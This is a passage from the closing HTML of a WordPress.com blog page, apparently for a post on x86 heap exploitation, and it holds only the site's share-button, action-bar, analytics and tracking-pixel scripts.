				}
				windowOpen = window.open( jQuery(this).attr( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
				return false;
			});
		});
		</script>
		<script type='text/javascript' src='https://s1.wp.com/wp-content/mu-plugins/akismet-3.0/_inc/form.js?m=1404442431h'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var actionbardata = {"siteID":"32641061","siteName":"gb_master's \/dev\/null","siteURL":"http:\/\/gbmaster.wordpress.com","icon":"<img alt='' src='https:\/\/s1.wp.com\/i\/void.gif' class='avatar avatar-36' height='36' width='36' \/>","canManageOptions":"","canCustomizeSite":"","isFollowing":"","themeSlug":"pub\/escutcheon","signupURL":"https:\/\/wordpress.com\/start\/","loginURL":"https:\/\/gbmaster.wordpress.com\/wp-login.php?redirect_to=https%3A%2F%2Fgbmaster.wordpress.com%2F2015%2F07%2F16%2Fx86-exploitation-101-house-of-lore-people-and-traditions%2F","themeURL":"https:\/\/wordpress.com\/themes\/escutcheon\/","xhrURL":"https:\/\/gbmaster.wordpress.com\/wp-admin\/admin-ajax.php","nonce":"6a8b5ad6b2","isSingular":"1","isFolded":"","isLoggedIn":"","isMobile":"","subscribeNonce":"<input type=\"hidden\" id=\"_wpnonce\" name=\"_wpnonce\" value=\"0b30ea2e05\" \/>","referer":"https:\/\/gbmaster.wordpress.com\/2015\/07\/16\/x86-exploitation-101-house-of-lore-people-and-traditions\/","canFollow":"1","statusMessage":"","customizeLink":"https:\/\/gbmaster.wordpress.com\/wp-admin\/customize.php?url=https%3A%2F%2Fgbmaster.wordpress.com%2F2015%2F07%2F16%2Fx86-exploitation-101-house-of-lore-people-and-traditions%2F","postID":"455","shortlink":"http:\/\/wp.me\/p2cXqJ-7l","canEditPost":"","editLink":"https:\/\/wordpress.com\/post\/gbmaster.wordpress.com\/455","i18n":{"view":"View Site","follow":"Follow","following":"Following","edit":"Edit","login":"Log In","signup":"Sign Up","customize":"Customize","report":"Report this content","themeInfo":"Get theme: Escutcheon","shortlink":"Copy shortlink","copied":"Copied","followedText":"New posts from this site will now appear in your <a href=\"https:\/\/wordpress.com\/\">Reader<\/a>","foldBar":"Collapse this bar","unfoldBar":"Expand this bar","editFollows":"Manage Sites I Follow","editSubs":"Manage Subscriptions","viewReader":"View Site in the Reader","subscribe":"Sign me up","enterEmail":"Enter your email address","followers":"Join 205 other followers","alreadyUser":"Already have a WordPress.com account? <a href=\"https:\/\/gbmaster.wordpress.com\/wp-login.php?redirect_to=https%3A%2F%2Fgbmaster.wordpress.com%2F2015%2F07%2F16%2Fx86-exploitation-101-house-of-lore-people-and-traditions%2F\">Log in now.<\/a>"}};
/* ]]> */
</script>
<script type='text/javascript'>
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1"};
/* ]]> */
</script>
<script type='text/javascript' src='https://s2.wp.com/_static/??-eJyVj+EOgjAMhF/IWY0G/GN8ljEKFLZurhvq2wsmKtHExF9t0u96d3AJynhOyAl6gRpHMhiu615WsDi5rILNLbGApQEFzhkzdppri/ETTh26CQm5AhSTk+nQM2gRTDKbsB6p1Yk8/6uUgYKyxINqvMmiGnolJTY21/jAjHdueqciBntbO/ryWdTRZg5S6fjeftDBS1KN1RRBOh2J2+ecRCd33O7LYrc7FOWmvwPPiYFG'></script>
<script type="text/javascript">
// <![CDATA[
(function() {
try{
  if ( window.external &&'msIsSiteMode' in window.external) {
    if (window.external.msIsSiteMode()) {
      var jl = document.createElement('script');
      jl.type='text/javascript';
      jl.async=true;
      jl.src='/wp-content/plugins/ie-sitemode/custom-jumplist.php';
      var s = document.getElementsByTagName('script')[0];
      s.parentNode.insertBefore(jl, s);
    }
  }
}catch(e){}
})();
// ]]>
</script>	<script type="text/javascript">
	var skimlinks_pub_id = "725X584219"
	var skimlinks_sitename = "gbmaster.wordpress.com";
	</script>
	<script type="text/javascript" src="https://s.skimresources.com/js/725X1342.skimlinks.js"></script>		<iframe src='https://widgets.wp.com/likes/master.html?ver=20160429#ver=20160429' scrolling='no' id='likes-master' name='likes-master' style='display:none;'></iframe>
		<div id='likes-other-gravatars'><div class="likes-text"><span>%d</span> bloggers like this:</div><ul class="wpl-avatars sd-like-gravatars"></ul></div>
		<script>
			var _comscore = _comscore || [];
			_comscore.push({
				c1: "2",
				c2: "7518284"
			});
			(function() {
				var s = document.createElement("script"),
					el = document.getElementsByTagName("script")[0];
				s.async = true;
				s.src = (document.location.protocol == "https:" ? "https://sb" : "http://b") + ".scorecardresearch.com/beacon.js";
				el.parentNode.insertBefore(s, el);
			})();
		</script>
		<noscript>
			<p class="robots-nocontent"><img src="https://sb.scorecardresearch.com/p?c1=2&c2=7518284&c3=&c4=&c5=&c6=&c15=&cv=2.0&cj=1" alt="" style="display:none;" width="1" height="1" /></p>
		</noscript><script src="//stats.wp.com/w.js?54" type="text/javascript" async defer></script>
<script type="text/javascript">
_tkq = window._tkq || [];
_stq = window._stq || [];
_tkq.push(['storeContext', {'blog_id':'32641061','blog_tz':'2','user_lang':'en','blog_lang':'en','user_id':'0'}]);
_stq.push(['view', {'blog':'32641061','v':'wpcom','tz':'2','user_id':'0','post':'455','subd':'gbmaster'}]);
_stq.push(['extra', {'crypt':'UE5XaGUuOTlwaD85flAmcm1mcmZsaDhkV11YdWFnNncxc1tjZG9XVXhRREQ/V0xPZ1hKXy9KbW0xcXhPcE1XdWpaNVF3UkJZNlpOMG9rMXhCPTFBTGdZYWRocXAlMixucG5BNWxkODg5WjRSZGF3cWtfK2N4KyU3ZmVqc0dZaGJtREddTy4/ZVFXV2tqXXxMbFUwVj9jeEJMVk9kWnN1ZFRPWT9iOC8wSm4/bE5OK1dQMCZdbUtEek9qUEROK3pfNHpfRiU4N0trYlFjaEhhN0Z4LTYtfkl+XSZhMmcyOUEvV1JtTXpSP0t2fkd+QVhHbmUtelNBeSZNRFVpU0EvPyUvcjJpZGh+cA=='}]);
_stq.push([ 'clickTrackerInit', '32641061', '455' ]);
	</script>
<noscript><img src="https://pixel.wp.com/b.gif?v=noscript" style="height:0px;width:0px;overflow:hidden" alt="" /></noscript>
<script>
if ( 'object' === typeof wpcom_mobile_user_agent_info ) {

	wpcom_mobile_user_agent_info.init();
	var mobileStatsQueryString = "";
	
	if( false !== wpcom_mobile_user_agent_info.matchedPlatformName )
		mobileStatsQueryString += "&x_" + 'mobile_platforms' + '=' + wpcom_mobile_user_agent_info.matchedPlatformName;
	
	if( false !== wpcom_mobile_user_agent_info.matchedUserAgentName )
		mobileStatsQueryString += "&x_" + 'mobile_devices' + '=' + wpcom_mobile_user_agent_info.matchedUserAgentName;
	
	if( wpcom_mobile_user_agent_info.isIPad() )
		mobileStatsQueryString += "&x_" + 'ipad_views' + '=' + 'views';

	if( "" != mobileStatsQueryString ) {
		new Image().src = document.location.protocol + '//pixel.wp.com/g.gif?v=wpcom-no-pv' + mobileStatsQueryString + '&baba=' + Math.random();
	}
	
}
</script>
</body>
</html>
